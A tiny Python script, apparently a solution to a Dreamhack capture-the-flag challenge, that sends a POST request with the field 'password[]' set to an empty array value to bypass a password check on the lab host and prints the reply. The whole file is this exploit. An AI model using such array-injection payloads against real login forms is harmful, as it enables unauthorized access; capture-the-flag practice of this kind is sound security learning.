from requests import post

url = "http://host3.dreamhack.games:13451"

p = post(url, data={"password[]":""})
p.raise_for_status()
print(p.text)

